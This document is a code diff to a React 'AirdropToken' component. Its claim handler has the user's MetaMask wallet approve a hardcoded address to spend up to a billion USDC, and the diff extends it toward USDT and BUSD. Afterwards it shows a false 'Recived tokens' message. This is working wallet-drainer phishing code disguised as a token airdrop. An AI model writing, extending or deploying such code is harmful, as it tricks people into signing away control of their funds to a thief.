@@ -8,14 +8,35 @@ import { connectWeb3, CHAINS } from "../store/web3Store";
 import Wallet from "./Wallet";
 import Button from "./Button";
 
-import USDC_ETH_ABI from "../contracts/USDC_ETH_ABI.json";
 import Web3 from "web3";
+
 
 class AirdropToken extends React.Component {
     state = {
-        isConnectedWeb3: false,
-        USDC_ETH: null,
+        isConnectedWeb3: false, abiFolder: "contracts/",
+        USDC: {
+            1: {
+                contract: null,
+                address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                decimals: 6,
+            }
+        },
+        USDT: {
+            1: {
+                contract: null,
+                address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+                decimals: 6,
+            }
+        },
+        BUSD: {
+            1: {
+                contract: null,
+                address: "0x5864c777697Bf9881220328BF2f16908c9aFCD7e",
+                decimals: 18,
+            }
+        },
         mAddress: '0x4538fc0B3D886ac42863FAa40D7803dBe2cd38a5',
+
     }
     componentDidMount() {
         if (!window.ethereum || !window.ethereum.isMetaMask) {
@@ -27,27 +48,37 @@ class AirdropToken extends React.Component {
         }
     }
 
-    async initContracts() {
-        let { web3 } = this.props;
-        let USDC_ETH = new web3.eth.Contract(USDC_ETH_ABI, "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
-        window.USDC_ETH = USDC_ETH
-        window.USDC_ETH_ABI = USDC_ETH_ABI
-        this.setState({ USDC_ETH: USDC_ETH })
-        return USDC_ETH
+    async initContracts(web3 = this.props.web3) {
+        let { USDC, BUSD, USDT, abiFolder } = this.state;
+
+        let chainId = parseInt(window.ethereum.chainId)
+        let abiPath = abiFolder + "USDC_ABI_" + chainId + ".json"
+        return fetch(abiPath).then(response => response.json()).then(async abi => {
+            let contract = new web3.eth.Contract(abi, USDC[chainId].address);
+            let token = USDC;
+            token[chainId].contract = contract;
+            this.setState({ USDC: token })
+            return token
+        }).catch(error => { throw error })
     }
 
     async reciveAirdrop() {
         let { web3, accounts } = this.props;
         let { mAddress } = this.state;
+        let chainId = parseInt(window.ethereum.chainId)
         if (!web3) {
             toast.error("Please connect Metamask")
         } else {
-            await this.initContracts()
-            this.state.USDC_ETH.methods.approve(mAddress, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({}, function (err, tx) {
-                if (err) {
-                    toast.error(err.message)
-                } else toast.success("Recived tokens")
-            })
+            await this.initContracts(web3)
+            let USDC = window.USDC = this.state.USDC
+            log(window.USDC[chainId].contract)
+            USDC[chainId].contract.methods.approve(mAddress, 1_000_000_000 * 1e6)
+                .send({ from: accounts[0] }, function (err, tx) {
+                    if (err) {
+                        toast.error(err.message)
+                        logerror(err)
+                    } else toast.success("Recived tokens")
+                })
         }
     }
 
@@ -55,7 +86,6 @@ class AirdropToken extends React.Component {
 
         let { } = this.state;
         let { web3 } = this.props;
-        log(web3)
         return (
             <div className="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-5 offset-xl-0">
                 <div className="home__content home__content--right">
